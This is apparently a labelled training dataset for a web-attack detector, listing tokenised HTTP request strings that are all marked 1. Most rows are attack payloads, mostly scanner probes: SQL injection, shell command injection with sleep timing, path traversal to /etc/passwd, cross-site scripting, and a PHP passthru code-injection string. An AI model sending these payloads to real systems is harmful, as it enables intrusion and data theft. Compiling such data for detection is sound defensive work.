sentences 	 labels
/ javascript & fusion . exe  	 1
/ string & strings & parameters = 1 '  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' jiyx '  =  ' jiyx  	 1
/ string & modo = registro & login =  + vonnie & password = llanisca & nombre = onella & apellidos = wiedeman + naln & email = sirichanya @ vinavilano . pe & dni = 97036086y & direccion = calle + yela + utrilla + 150 +  & ciudad = villanueva + del + trabuco & cp = 37450 & provincia = mlaga & ntc = 3862460916827849 & b1 = registrar  	 1
/ string & strings & parameters = 1 "  "  ; select case when 7717 = 7717 then 1 else null end --  	 1
/ examples & jsp & error & cwmail . exe  	 1
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file }  	 1
/ top . php ? stuff =  '  ; rm \ x09q48683432 \ x09 #? stuff =  '  ; rm \ x09q48683432 \ x09 #  	 1
/ string & strings & parameters = "  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file }  	 1
/  { file }  	 1
/ en-us & account & cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ manager & nucleus & libs & pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  	 1
/ include & include_top . php ? g_include = xxpathxx  	 1
/ phpmyadmin & www & delivery & ac . php ? bannerid = -1331904221 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ucypkczy ]  )  )  ; die ;  /  *  	 1
/ examples & jsp & checkbox & kb . cgi ? view =  '  & lang = en  	 1
/ scripts & msmmask . exe ? mask =  / nessus893655960 . asp  	 1
/ javascript &  . passwd . ini  	 1
/ string & strings & parameters = '  ; echo $ ifsxqahul $  (  ( 9 + 99 )  )  $  ( echo $ ifsxqahul ) xqahul '  	 1
/ javascript & portals . exe  	 1
/ string & strings & parameters = < head >  < meta http-equiv =  "  " content-type "  "  content =  "  " text & html ;  charset = utf-7 "  "  >   <  & head >  + adw-script + ad4-alert (  ' crosssitescripting '  )  ;  + adw- & script + ad4-  	 1
/ main . php ? logout =  '  \ x0auname  > q64819443  #? logout =  '  \ x0auname  > q64819443  #  	 1
/ cgi-bin & apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  	 1
/ string & strings & parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ javascript & chrome . exe  	 1
/ quagynka . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ javascript & esales . exe  	 1
/ string & strings & parameters = 1 "  "  )  as tecq where 4817 = 4817 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ string & strings & parameters = < marquee loop = 1 width = 0 onfinish = confirm ( 1 )  > 0 <  & marquee >  	 1
/ string & str =  $  ( echo tikhvb )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ scripts & sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl  	 1
/ string & strings & parameters = 1 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  viti  	 1
/ en-us & s7qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = 1 '  ,  ( select  *  from generate_series ( 5609 , 5609 , case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 )  	 1
/ string & strings & parameters = echo lbgscb $  (  ( 75 + 53 )  )  $  ( echo lbgscb ) lbgscb &  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
